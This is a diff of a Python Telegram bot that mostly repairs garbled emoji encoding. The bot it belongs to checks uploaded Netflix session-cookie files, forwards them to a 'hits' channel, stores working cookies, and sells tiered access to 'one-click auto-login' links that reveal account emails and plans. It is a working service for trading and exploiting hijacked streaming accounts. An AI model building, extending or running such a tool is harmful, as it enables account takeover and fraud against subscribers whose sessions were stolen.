-    uname = f"@{user.username}" if user.username else "â€”"
+    uname = f"@{user.username}" if user.username else "—"
     uid   = user.id
     name  = user.first_name or "User"
 
     owner_caption = (
-        f"ðŸ’³ <b>PAYMENT PROOF RECEIVED</b>\n\n"
-        f"ðŸ‘¤ <b>Name    :</b> {name}\n"
-        f"ðŸ†” <b>User ID :</b> <code>{uid}</code>\n"
-        f"ðŸ“› <b>Username:</b> {uname}\n\n"
-        f"ðŸ“¦ <b>Plan    :</b> 7 Days\n"
-        f"ðŸ’µ <b>Price   :</b> $1.00\n\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"💳 <b>PAYMENT PROOF RECEIVED</b>\n\n"
+        f"👤 <b>Name    :</b> {name}\n"
+        f"🆔 <b>User ID :</b> <code>{uid}</code>\n"
+        f"📛 <b>Username:</b> {uname}\n\n"
+        f"📦 <b>Plan    :</b> 7 Days\n"
+        f"💵 <b>Price   :</b> $1.00\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"If payment is valid, generate key:\n"
         f"<code>/genkey</code>\n"
         f"Then send the key to user ID: <code>{uid}</code>"
@@ -843,27 +843,27 @@ def _forward_payment_proof_from_reply(cmd_message, replied_message, proof_type: 
 
     bot.reply_to(
         cmd_message,
-        "âœ… <b>Payment proof received!</b>\n\n"
+        "✅ <b>Payment proof received!</b>\n\n"
         "Our team will verify your payment and send your key shortly.\n"
-        "Please wait... ðŸ™"
+        "Please wait... 🙏"
     )
 
 
 def _forward_payment_proof(message, proof_type: str):
-    """Shared helper â€” forwards payment proof (photo or document) to owner."""
+    """Shared helper — forwards payment proof (photo or document) to owner."""
     user  = message.from_user
-    uname = f"@{user.username}" if user.username else "â€”"
+    uname = f"@{user.username}" if user.username else "—"
     uid   = user.id
     name  = user.first_name or "User"
 
     owner_caption = (
-        f"ðŸ’³ <b>PAYMENT PROOF RECEIVED</b>\n\n"
-        f"ðŸ‘¤ <b>Name    :</b> {name}\n"
-        f"ðŸ†” <b>User ID :</b> <code>{uid}</code>\n"
-        f"ðŸ“› <b>Username:</b> {uname}\n\n"
-        f"ðŸ“¦ <b>Plan    :</b> 7 Days\n"
-        f"ðŸ’µ <b>Price   :</b> $1.00\n\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"💳 <b>PAYMENT PROOF RECEIVED</b>\n\n"
+        f"👤 <b>Name    :</b> {name}\n"
+        f"🆔 <b>User ID :</b> <code>{uid}</code>\n"
+        f"📛 <b>Username:</b> {uname}\n\n"
+        f"📦 <b>Plan    :</b> 7 Days\n"
+        f"💵 <b>Price   :</b> $1.00\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"If payment is valid, generate key:\n"
         f"<code>/genkey</code>\n"
         f"Then send the key to user ID: <code>{uid}</code>"
@@ -879,9 +879,9 @@ def _forward_payment_proof(message, proof_type: str):
 
     bot.reply_to(
         message,
-        "âœ… <b>Payment proof received!</b>\n\n"
+        "✅ <b>Payment proof received!</b>\n\n"
         "Our team will verify your payment and send your key shortly.\n"
-        "Please wait... ðŸ™"
+        "Please wait... 🙏"
     )
 
 
@@ -889,7 +889,7 @@ def _forward_payment_proof(message, proof_type: str):
 @bot.message_handler(commands=["expire"])
 def cmd_expire(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
     parts = message.text.split()
     if len(parts) < 2:
@@ -899,73 +899,73 @@ def cmd_expire(message):
     if target.startswith("@"):
         row = get_user_by_username(target[1:])
         if not row:
-            bot.reply_to(message, f"âŒ Username <code>{target}</code> not found.")
+            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
             return
         uid = row[0]
     elif target.isdigit():
         uid = int(target)
         row = get_user(uid)
         if not row:
-            bot.reply_to(message, f"âŒ User ID <code>{uid}</code> not found.")
+            bot.reply_to(message, f"❌ User ID <code>{uid}</code> not found.")
             return
     else:
-        bot.reply_to(message, "âŒ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
+        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
         return
     expire_access(uid)
-    bot.reply_to(message, f"âœ… Access for <code>{uid}</code> has been <b>revoked immediately</b>.")
+    bot.reply_to(message, f"✅ Access for <code>{uid}</code> has been <b>revoked immediately</b>.")
 
 
-# â”€â”€ /db â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /db ───────────────────────────────────────────────
 @bot.message_handler(commands=["db"])
 def cmd_db(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
 
     total_hits = count_hits_db()
     bot.reply_to(
         message,
-        f"ðŸª <b>Cookie Stock in DB</b>\n\n"
-        f"ðŸ“¦ Available hits: <code>{total_hits}</code>\n"
-        f"ðŸ•’ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
+        f"🍪 <b>Cookie Stock in DB</b>\n\n"
+        f"📦 Available hits: <code>{total_hits}</code>\n"
+        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
     )
 
 
 
-# â”€â”€ /sendkey â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /sendkey ──────────────────────────────────────────
 @bot.message_handler(commands=["sendkey"])
 def cmd_sendkey(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
 
     PLAN_DAYS = 7
     parts = message.text.split()
 
-    # â”€â”€ /sendkey (no args) â†’ generate & send to owner â”€â”€
+    # ── /sendkey (no args) → generate & send to owner ──
     if len(parts) == 1:
         key = create_key(PLAN_DAYS, sold_to=None)
         try:
             bot.send_message(
                 OWNER_ID,
-                f"ðŸ”‘ <b>Key Generated (for you)</b>\n\n"
-                f"ðŸ“¦ <b>Plan :</b> {PLAN_DAYS} Days\n"
-                f"ðŸ”‘ <b>Key  :</b> <code>{key}</code>\n\n"
+                f"🔑 <b>Key Generated (for you)</b>\n\n"
+                f"📦 <b>Plan :</b> {PLAN_DAYS} Days\n"
+                f"🔑 <b>Key  :</b> <code>{key}</code>\n\n"
                 f"Use /redeem {key} to activate, or send it manually."
             )
-            bot.reply_to(message, f"âœ… <b>Key generated and sent to you!</b>\nðŸ”‘ <code>{key}</code>")
+            bot.reply_to(message, f"✅ <b>Key generated and sent to you!</b>\n🔑 <code>{key}</code>")
         except Exception as e:
-            bot.reply_to(message, f"âŒ Error: <code>{e}</code>")
+            bot.reply_to(message, f"❌ Error: <code>{e}</code>")
         return
 
     target = parts[1].strip()
 
-    # â”€â”€ Resolve target to user_id â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Resolve target to user_id ──────────────────────
     if target.startswith("@"):
         uname = target[1:]
         row   = get_user_by_username(uname)
         if not row:
-            bot.reply_to(message, f"âŒ Username <code>@{uname}</code> not found in bot database.\nMake sure they have used the bot before.")
+            bot.reply_to(message, f"❌ Username <code>@{uname}</code> not found in bot database.\nMake sure they have used the bot before.")
             return
         target_id   = row[0]
         target_name = row[2] or uname
@@ -974,38 +974,38 @@ def cmd_sendkey(message):
         target_id = int(target)
         row       = get_user(target_id)
         if not row:
-            bot.reply_to(message, f"âŒ User ID <code>{target_id}</code> not found in bot database.")
+            bot.reply_to(message, f"❌ User ID <code>{target_id}</code> not found in bot database.")
             return
         target_name   = row[2] or str(target_id)
         sold_to_label = f"@{row[1]}" if row[1] else str(target_id)
     else:
-        bot.reply_to(message, "âŒ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
+        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
         return
 
-    # â”€â”€ Generate & send key to target user â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Generate & send key to target user ─────────────
     key = create_key(PLAN_DAYS, sold_to=sold_to_label)
     try:
         bot.send_message(
             target_id,
-            f"ðŸŽ‰ <b>Your Access Key is Ready!</b>\n\n"
-            f"ðŸ“¦ <b>Plan :</b> {PLAN_DAYS} Days\n"
-            f"ðŸ”‘ <b>Key  :</b> <code>{key}</code>\n\n"
+            f"🎉 <b>Your Access Key is Ready!</b>\n\n"
+            f"📦 <b>Plan :</b> {PLAN_DAYS} Days\n"
+            f"🔑 <b>Key  :</b> <code>{key}</code>\n\n"
             f"Use the command below to activate:\n"
             f"<code>/redeem {key}</code>\n\n"
             f"[ BOT : @netflixpctvphonebot ]"
         )
         bot.reply_to(
             message,
-            f"âœ… <b>Key sent successfully!</b>\n\n"
-            f"ðŸ‘¤ <b>To    :</b> {target_name} (<code>{target_id}</code>)\n"
-            f"ðŸ”‘ <b>Key   :</b> <code>{key}</code>\n"
-            f"ðŸ“¦ <b>Plan  :</b> {PLAN_DAYS} Days"
+            f"✅ <b>Key sent successfully!</b>\n\n"
+            f"👤 <b>To    :</b> {target_name} (<code>{target_id}</code>)\n"
+            f"🔑 <b>Key   :</b> <code>{key}</code>\n"
+            f"📦 <b>Plan  :</b> {PLAN_DAYS} Days"
         )
     except Exception as e:
-        bot.reply_to(message, f"âŒ Failed to send key: <code>{e}</code>")
+        bot.reply_to(message, f"❌ Failed to send key: <code>{e}</code>")
 
 
-# â”€â”€ /ask â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /ask ──────────────────────────────────────────────
 @bot.message_handler(commands=["ask"])
 def cmd_ask(message):
     user  = message.from_user
@@ -1015,14 +1015,14 @@ def cmd_ask(message):
     if len(parts) < 2 or not parts[1].strip():
         bot.reply_to(
             message,
-            "â“ <b>Ask the Owner</b>\n\n"
+            "❓ <b>Ask the Owner</b>\n\n"
             "Usage: <code>/ask [your question]</code>\n"
             "Example: <code>/ask How do I redeem my key?</code>"
         )
         return
 
     question = parts[1].strip()
-    uname    = f"@{user.username}" if user.username else "â€”"
+    uname    = f"@{user.username}" if user.username else "—"
     tier     = get_user_tier(user.id)
     plan_names = {
         "owner": "Owner", "paid": "Paid (7 Days)",
@@ -1034,28 +1034,28 @@ def cmd_ask(message):
     try:
         bot.send_message(
             OWNER_ID,
-            f"â“ <b>NEW QUESTION</b>\n\n"
-            f"ðŸ‘¤ <b>Name    :</b> {user.first_name or 'â€”'}\n"
-            f"ðŸ†” <b>User ID :</b> <code>{user.id}</code>\n"
-            f"ðŸ“› <b>Username:</b> {uname}\n"
-            f"ðŸ“‹ <b>Plan    :</b> {plan_label}\n\n"
-            f"ðŸ’¬ <i>{question}</i>\n\n"
+            f"❓ <b>NEW QUESTION</b>\n\n"
+            f"👤 <b>Name    :</b> {user.first_name or '—'}\n"
+            f"🆔 <b>User ID :</b> <code>{user.id}</code>\n"
+            f"📛 <b>Username:</b> {uname}\n"
+            f"📋 <b>Plan    :</b> {plan_label}\n\n"
+            f"💬 <i>{question}</i>\n\n"
             f"Reply: <code>/reply {user.id} [your answer]</code>"
         )
         bot.reply_to(
             message,
-            "âœ… <b>Your question has been sent to the owner!</b>\n"
-            "Please wait for a reply. ðŸ˜Š"
+            "✅ <b>Your question has been sent to the owner!</b>\n"
+            "Please wait for a reply. 😊"
         )
     except Exception as e:
-        bot.reply_to(message, f"âŒ Failed to send question: <code>{e}</code>")
+        bot.reply_to(message, f"❌ Failed to send question: <code>{e}</code>")
 
 
-# â”€â”€ /reply (owner â†’ user) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /reply (owner → user) ─────────────────────────────
 @bot.message_handler(commands=["reply"])
 def cmd_reply(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
 
     parts = message.text.split(maxsplit=2)
@@ -1075,7 +1075,7 @@ def cmd_reply(message):
     if target.startswith("@"):
         row = get_user_by_username(target[1:])
         if not row:
-            bot.reply_to(message, f"âŒ Username <code>{target}</code> not found.")
+            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
             return
         target_id   = row[0]
         target_name = row[2] or target
@@ -1083,68 +1083,68 @@ def cmd_reply(message):
         target_id = int(target)
         row       = get_user(target_id)
         if not row:
-            bot.reply_to(message, f"âŒ User ID <code>{target_id}</code> not found.")
+            bot.reply_to(message, f"❌ User ID <code>{target_id}</code> not found.")
             return
         target_name = row[2] or str(target_id)
     else:
-        bot.reply_to(message, "âŒ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
+        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
         return
 
     try:
         bot.send_message(
             target_id,
-            f"ðŸ’¬ <b>Reply from Owner:</b>\n\n"
+            f"💬 <b>Reply from Owner:</b>\n\n"
             f"{reply_text}\n\n"
             f"[ BOT : @netflixpctvphonebot ]"
         )
         bot.reply_to(
             message,
-            f"âœ… <b>Reply sent!</b>\n"
-            f"ðŸ‘¤ To: {target_name} (<code>{target_id}</code>)"
+            f"✅ <b>Reply sent!</b>\n"
+            f"👤 To: {target_name} (<code>{target_id}</code>)"
         )
     except Exception as e:
-        bot.reply_to(message, f"âŒ Failed to send reply: <code>{e}</code>")
+        bot.reply_to(message, f"❌ Failed to send reply: <code>{e}</code>")
 
 
-# â”€â”€ /keys â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /keys ─────────────────────────────────────────────
 @bot.message_handler(commands=["keys"])
 def cmd_keys(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "â›” Owner only.")
+        bot.reply_to(message, "⛔ Owner only.")
         return
 
     unused = list_keys(used=False)
     used   = list_keys(used=True)
 
     lines = []
-    lines.append(f"ðŸ”‘ KEY REPORT â€” {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
+    lines.append(f"🔑 KEY REPORT — {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
     lines.append(f"  Unused : {len(unused)}")
     lines.append(f"  Used   : {len(used)}")
     lines.append("")
 
-    lines.append("â”€â”€ UNUSED KEYS " + "â”€" * 35)
+    lines.append("── UNUSED KEYS " + "─" * 35)
     for row in unused:
         key, days, created_at, _, _, sold_to = row
         tag = f"Sold to {sold_to}" if sold_to else "Gen for owner"
-        lines.append(f"  ðŸ”‘ {key}  ({days}d)  Created: {created_at}  [{tag}]")
+        lines.append(f"  🔑 {key}  ({days}d)  Created: {created_at}  [{tag}]")
     lines.append("")
 
-    lines.append("â”€â”€ USED KEYS " + "â”€" * 37)
+    lines.append("── USED KEYS " + "─" * 37)
     for row in used:
         key, days, created_at, used_by, used_at, sold_to = row
         tag = f"Sold to {sold_to}" if sold_to else "Gen for owner"
-        lines.append(f"  âœ… {key}  ({days}d)  Used by: {used_by}  At: {used_at}  [{tag}]")
+        lines.append(f"  ✅ {key}  ({days}d)  Used by: {used_by}  At: {used_at}  [{tag}]")
 
     content  = "\n".join(lines)
     fname    = f"keys_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
     bot.send_document(
         message.chat.id,
         (fname, content.encode("utf-8")),
-        caption=f"ðŸ”‘ <b>Keys:</b> {len(unused)} unused | {len(used)} used"
+        caption=f"🔑 <b>Keys:</b> {len(unused)} unused | {len(used)} used"
     )
 
 
-# â”€â”€ /redeem â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── /redeem ───────────────────────────────────────────
 @bot.message_handler(commands=["redeem"])
 def cmd_redeem(message):
     user = message.from_user
@@ -1153,7 +1153,7 @@ def cmd_redeem(message):
     allowed, reason = check_access(user.id)
     # Even expired users can redeem (to renew)
     if reason == "banned":
-        bot.reply_to(message, "ðŸš« <b>You are banned and cannot redeem keys.</b>")
+        bot.reply_to(message, "🚫 <b>You are banned and cannot redeem keys.</b>")
         return
 
     parts = message.text.split()
@@ -1170,46 +1170,46 @@ def cmd_redeem(message):
         new_exp = row[4] if row else "Unknown"
         bot.reply_to(
             message,
-            f"âœ… <b>Key redeemed successfully!</b>\n\n"
-            f"ðŸ”‘ <b>Key     :</b> <code>{key}</code>\n"
-            f"â³ <b>Duration:</b> <code>{days} day(s)</code>\n"
-            f"ðŸ“… <b>Expires :</b> <code>{time_remaining(new_exp)}</code>"
+            f"✅ <b>Key redeemed successfully!</b>\n\n"
+            f"🔑 <b>Key     :</b> <code>{key}</code>\n"
+            f"⏳ <b>Duration:</b> <code>{days} day(s)</code>\n"
+            f"📅 <b>Expires :</b> <code>{time_remaining(new_exp)}</code>"
         )
     elif result == "used":
-        bot.reply_to(message, "âŒ <b>This key has already been used.</b>")
+        bot.reply_to(message, "❌ <b>This key has already been used.</b>")
     else:
-        bot.reply_to(message, "âŒ <b>Invalid key.</b> Please check and try again.")
+        bot.reply_to(message, "❌ <b>Invalid key.</b> Please check and try again.")
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #              DOCUMENT HANDLER (COOKIE FILES + PAYMENT)
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 @bot.message_handler(content_types=["document"])
 def handle_document(message):
     user    = message.from_user
     caption = (message.caption or "").strip().lower()
 
-    # â”€â”€ /payment proof via file â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── /payment proof via file ────────────────────────
     if caption.startswith("/payment"):
         register_user(user, FREE_DAYS)
         _, reason = check_access(user.id)
         if reason == "banned":
-            bot.reply_to(message, "ðŸš« <b>You are banned.</b>")
+            bot.reply_to(message, "🚫 <b>You are banned.</b>")
             return
         _forward_payment_proof(message, proof_type="document")
         return
 
-    # â”€â”€ Cookie file handler â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Cookie file handler ────────────────────────────
     register_user(user, FREE_DAYS)
     tier = get_user_tier(user.id)
 
     if tier == "banned":
-        bot.reply_to(message, "ðŸš« <b>You are banned.</b>")
+        bot.reply_to(message, "🚫 <b>You are banned.</b>")
         return
 
     doc = message.document
     if not doc.file_name.endswith((".txt", ".json", ".log")):
-        bot.reply_to(message, "âš ï¸ Please send a <code>.txt</code>, <code>.json</code>, or <code>.log</code> file.")
+        bot.reply_to(message, "⚠️ Please send a <code>.txt</code>, <code>.json</code>, or <code>.log</code> file.")
         return
 
     try:
@@ -1221,10 +1221,10 @@ def handle_document(message):
         total   = len(bundles)
 
         if total == 0:
-            bot.reply_to(message, "âŒ No valid Netflix cookies found in this file.")
+            bot.reply_to(message, "❌ No valid Netflix cookies found in this file.")
             return
 
-        # â”€â”€ Free User: limit to 20 cookies/day â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Free User: limit to 20 cookies/day ────────
         if tier == "free_user":
             FREE_USER_COOKIE_LIMIT = 20
             used_today = get_free_user_cookies_today(user.id)
@@ -1233,12 +1233,12 @@ def handle_document(message):
             if remaining <= 0:
                 bot.reply_to(
                     message,
-                    "âŒ <b>Daily limit reached!</b>\n\n"
-                    "ðŸ“‹ <b>Your Plan:</b> Free User\n"
+                    "❌ <b>Daily limit reached!</b>\n\n"
+                    "📋 <b>Your Plan:</b> Free User\n"
                     "You can check up to <b>20 cookies per day</b>.\n"
-                    "ðŸ•› Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n\n"
-                    "ðŸ’¡ Upgrade your plan with /buy for unlimited checking!\n"
-                    "â“ Have a question? Use /ask to contact the owner."
+                    "🕛 Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n\n"
+                    "💡 Upgrade your plan with /buy for unlimited checking!\n"
+                    "❓ Have a question? Use /ask to contact the owner."
                 )
                 return
 
@@ -1247,33 +1247,33 @@ def handle_document(message):
 
             add_free_user_cookies(user.id, len(bundles))
 
-        # â”€â”€ Forward file to channel â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-        uname = f"@{user.username}" if user.username else "â€”"
+        # ── Forward file to channel ────────────────────
+        uname = f"@{user.username}" if user.username else "—"
         try:
             bot.send_document(
                 HITS_CHANNEL,
                 doc.file_id,
                 caption=(
-                    f"ðŸ†” <code>{user.id}</code>\n"
-                    f"ðŸ“› {uname}"
+                    f"🆔 <code>{user.id}</code>\n"
+                    f"📛 {uname}"
                 )
             )
         except Exception as e:
             print(f"[File Forward Error] {e}")
 
-        # â”€â”€ Block parallel checks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Block parallel checks ───────────────────────
         if user.id in active_checkers:
             bot.reply_to(
                 message,
-                "âš ï¸ <b>You already have a check running!</b>\n\n"
-                "Please wait for it to finish, or press ðŸ›‘ <b>Stop Checking</b> to cancel it first."
+                "⚠️ <b>You already have a check running!</b>\n\n"
+                "Please wait for it to finish, or press 🛑 <b>Stop Checking</b> to cancel it first."
             )
             return
 
         bot.reply_to(
             message,
-            f"âœ… <b>Loaded {len(bundles)} cookie bundle(s)</b> from <code>{doc.file_name}</code>\n\n"
-            f"â³ Starting check automatically..."
+            f"✅ <b>Loaded {len(bundles)} cookie bundle(s)</b> from <code>{doc.file_name}</code>\n\n"
+            f"⏳ Starting check automatically..."
         )
 
         import threading
@@ -1284,12 +1284,12 @@ def handle_document(message):
         ).start()
 
     except Exception as e:
-        bot.reply_to(message, f"âŒ Error reading file: <code>{e}</code>")
+        bot.reply_to(message, f"❌ Error reading file: <code>{e}</code>")
 
 
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 #              NF TOKEN COMMAND
-# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+# ═══════════════════════════════════════════════════════
 
 @bot.message_handler(commands=["nftoken"])
 def cmd_nftoken(message):
@@ -1301,12 +1301,12 @@ def cmd_nftoken(message):
     tier = get_user_tier(user.id)
 
     if tier == "banned":
-        bot.reply_to(message, "ðŸš« <b>You are banned.</b>")
+        bot.reply_to(message, "🚫 <b>You are banned.</b>")
         return
 
     uid = user.id
 
-    # â”€â”€ Determine daily limit based on tier â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Determine daily limit based on tier ───────────
     if tier == "owner":
         daily_limit = None   # unlimited
     elif tier == "paid":
@@ -1316,15 +1316,15 @@ def cmd_nftoken(message):
     else:  # free_user
         daily_limit = 1
 
-    # â”€â”€ Cooldown check (10 seconds) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Cooldown check (10 seconds) ────────────────────
     last_used = nftoken_cooldown.get(uid, 0)
     elapsed   = time.time() - last_used
     if elapsed < 10:
         remaining = int(10 - elapsed) + 1
-        bot.reply_to(message, f"â³ Please wait <b>{remaining}s</b> before using Generate Links Cookies again.")
+        bot.reply_to(message, f"⏳ Please wait <b>{remaining}s</b> before using Generate Links Cookies again.")
         return
 
-    # â”€â”€ Daily limit check â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Daily limit check ──────────────────────────────
     used_today = get_nftoken_usage(uid)
     if daily_limit is not None and used_today >= daily_limit:
         plan_names = {
@@ -1335,30 +1335,30 @@ def cmd_nftoken(message):
         plan_label = plan_names.get(tier, tier.replace("_", " ").title())
         bot.reply_to(
             message,
-            f"âŒ <b>Daily limit reached!</b>\n\n"
-            f"ðŸ“‹ <b>Your Plan:</b> {plan_label}\n"
+            f"❌ <b>Daily limit reached!</b>\n\n"
+            f"📋 <b>Your Plan:</b> {plan_label}\n"
             f"You can use Generate Links Cookies <b>{daily_limit} times per day</b>.\n"
-            f"ðŸ•› Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n"
-            f"â“ Have a question? Use /ask to contact the owner."
+            f"🕛 Resets every day at <b>00:00 UTC</b>. Try again tomorrow.\n"
+            f"❓ Have a question? Use /ask to contact the owner."
         )
         return
 
-    # â”€â”€ Check if there are any hits in DB â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Check if there are any hits in DB ─────────────
     if count_hits_db() == 0:
         bot.reply_to(
             message,
-            "ðŸ“­ <b>Not available yet.</b>\n\n"
+            "📭 <b>Not available yet.</b>\n\n"
             "If you want to watch and have a <code>.txt</code> cookies file, "
-            "you can check it here by sending the file directly to this bot! ðŸŽ¬"
+            "you can check it here by sending the file directly to this bot! 🎬"
         )
         return
 
-    # â”€â”€ Start process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Start process ──────────────────────────────────
     nftoken_cooldown[uid] = time.time()
 
     msg = bot.reply_to(
         message,
-        "â³ <b>[1/3] Querying Netflix Local &amp; Server Clusters...</b>\n"
+        "⏳ <b>[1/3] Querying Netflix Local &amp; Server Clusters...</b>\n"
         "<i>Retrieving cached sessions...</i>"
     )
 
@@ -1369,9 +1369,9 @@ def cmd_nftoken(message):
 
         if hit_id is None:
             bot.edit_message_text(
-                "ðŸ“­ <b>Not available yet.</b>\n\n"
+                "📭 <b>Not available yet.</b>\n\n"
                 "If you want to watch and have a <code>.txt</code> cookies file, "
-                "you can check it here by sending the file directly to this bot! ðŸŽ¬",
+                "you can check it here by sending the file directly to this bot! 🎬",
                 chat_id=msg.chat.id,
                 message_id=msg.message_id
             )
@@ -1380,7 +1380,7 @@ def cmd_nftoken(message):
         # Step 2
         try:
             bot.edit_message_text(
-                "ðŸ” <b>[2/3] Validating Live Cookie &amp; Extracting Tokens...</b>\n"
+                "🔍 <b>[2/3] Validating Live Cookie &amp; Extracting Tokens...</b>\n"
                 "<i>Testing Netflix session...</i>",
                 chat_id=msg.chat.id,
                 message_id=msg.message_id
@@ -1392,46 +1392,46 @@ def cmd_nftoken(message):
         res = check_netflix_cookie(bundle)
 
         if not res.get("alive") or not res.get("is_active"):
-            # Hit is dead â€” remove from DB and try next
+            # Hit is dead — remove from DB and try next
             delete_hit_from_db(hit_id)
             continue
 
         # Step 3
         try:
             bot.edit_message_text(
-                "ðŸ”— <b>[3/3] Generating Direct 1-Click Login Links...</b>",
+                "🔗 <b>[3/3] Generating Direct 1-Click Login Links...</b>",
                 chat_id=msg.chat.id,
                 message_id=msg.message_id
             )
         except Exception:
             pass
 
-        # â”€â”€ Build result â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        # ── Build result ───────────────────────────────
         increment_nftoken_usage(uid)
         if daily_limit is None:
-            usage_text = "â™¾ï¸ Unlimited (Owner)"
+            usage_text = "♾️ Unlimited (Owner)"
         else:
             remaining_today = daily_limit - (used_today + 1)
             usage_text = f"{used_today + 1}/{daily_limit} (remaining: {remaining_today})"
 
         result_text = (
-            f"ðŸŽ¬ <b>NETFLIX 1-CLICK TOKEN GENERATED</b> ðŸŒ\n\n"
-            f"ðŸ‘¤ <b>Account Details:</b>\n"
-            f"â€¢ <b>Email:</b> <code>{res.get('email', 'N/A')}</code>\n"
-            f"â€¢ <b>Plan:</b> {res.get('quality', 'HD')} ({res.get('streams', '?')} Screens)\n"
-            f"â€¢ <b>Country:</b> {res.get('country', 'N/A')}\n\n"
-            f"ðŸ–¥ï¸ <a href=\"{res.get('direct_url', '#')}\">Click Here to Auto-Login (PC Browser)</a>\n"
